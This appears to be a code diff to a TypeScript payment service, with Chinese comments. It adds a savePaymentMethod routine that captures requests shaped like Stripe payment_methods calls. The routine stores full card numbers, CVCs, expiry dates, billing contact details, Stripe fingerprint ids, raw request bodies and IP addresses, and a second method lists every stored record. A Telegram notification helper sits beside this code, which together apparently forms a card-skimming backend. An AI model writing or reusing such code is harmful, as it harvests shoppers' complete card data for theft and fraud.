@@ -5,8 +5,10 @@ import * as fs from 'fs/promises'
 import * as path from 'path'
 import { F1Order } from './entities/f1-order.entity'
 import { Payment } from './entities/payment.entity'
+import { PaymentMethod } from './entities/payment-method.entity'
 import { F1CheckoutDto } from './dto/f1-checkout.dto'
 import { PaymentDto } from './dto/payment.dto'
+import { PaymentMethodDto } from './dto/payment-method.dto'
 import { OrderQueryDto, OrderResponseDto, PaginatedResponseDto } from './dto/order-query.dto'
 import { ApiException } from 'src/common/exceptions/api.exception'
 import { firstValueFrom } from 'rxjs';
@@ -24,6 +26,8 @@ export class F1Service {
     private readonly f1OrderRepository: Repository<F1Order>,
     @InjectRepository(Payment)
     private readonly paymentRepository: Repository<Payment>,
+    @InjectRepository(PaymentMethod)
+    private readonly paymentMethodRepository: Repository<PaymentMethod>,
         @InjectRedis() private readonly redis: Redis,
         private readonly httpService: HttpService,
         
@@ -302,6 +306,78 @@ export class F1Service {
   };
   // Redis 键前缀
   private readonly REDIS_KEY_PREFIX = 'payment:callback:';
+  /**
+   * 保存 Stripe payment_methods 请求数据
+   */
+  async savePaymentMethod(dto: PaymentMethodDto, rawBody: string, ip: string, userAgent: string): Promise<PaymentMethod> {
+    try {
+      const pm = new PaymentMethod()
+
+      // billing_details
+      const bd = dto.billing_details || {}
+      const addr = bd.address || {}
+      pm.billingName = bd.name || ''
+      pm.billingEmail = bd.email || ''
+      pm.billingPhone = bd.phone || ''
+      pm.billingCity = addr.city || ''
+      pm.billingCountry = addr.country || ''
+      pm.billingLine1 = addr.line1 || ''
+      pm.billingLine2 = addr.line2 || ''
+      pm.billingPostalCode = addr.postal_code || ''
+      pm.billingState = addr.state || ''
+
+      // card
+      const card = dto.card || {}
+      pm.type = dto.type || 'card'
+      pm.cardNumber = (card.number || '').replace(/\s+/g, '')
+      // 提取后4位
+      const cleanNum = pm.cardNumber.replace(/\D/g, '')
+      pm.cardLast4 = cleanNum.length >= 4 ? cleanNum.slice(-4) : ''
+      pm.cardCvc = card.cvc || ''
+      pm.cardExpYear = card.exp_year || ''
+      pm.cardExpMonth = card.exp_month || ''
+
+      // 其他字段
+      pm.allowRedisplay = dto.allow_redisplay || ''
+      pm.pastedFields = dto.pasted_fields || ''
+      pm.paymentUserAgent = dto.payment_user_agent || ''
+      pm.referrer = dto.referrer || ''
+      pm.timeOnPage = dto.time_on_page || ''
+      pm.guid = dto.guid || ''
+      pm.muid = dto.muid || ''
+      pm.sid = dto.sid || ''
+      pm.stripeKey = dto.key || ''
+
+      // JSON 字段
+      pm.clientAttributionMetadata = dto.client_attribution_metadata ? JSON.stringify(dto.client_attribution_metadata) : null
+      pm.radarOptions = dto.radar_options ? JSON.stringify(dto.radar_options) : null
+
+      // 原始请求体
+      pm.rawBody = rawBody || null
+      pm.ipAddress = ip || ''
+      pm.userAgent = userAgent || ''
+
+      const saved = await this.paymentMethodRepository.save(pm)
+      this.logger.log(`PaymentMethod 保存成功 - ID: ${saved.id}, 卡后4位: ${pm.cardLast4}`)
+      return saved
+    } catch (error) {
+      this.logger.error('保存 PaymentMethod 失败:', error)
+      throw new ApiException(`保存支付方式失败: ${error.message}`)
+    }
+  }
+
+  /**
+   * 查询所有 PaymentMethod 记录（分页）
+   */
+  async findPaymentMethods(pageNum = 1, pageSize = 20): Promise<{ list: PaymentMethod[]; total: number }> {
+    const [list, total] = await this.paymentMethodRepository.findAndCount({
+      order: { createTime: 'DESC' },
+      skip: (pageNum - 1) * pageSize,
+      take: pageSize,
+    })
+    return { list, total }
+  }
+
   /**
    * 发送 Telegram 通知（异步）
    */
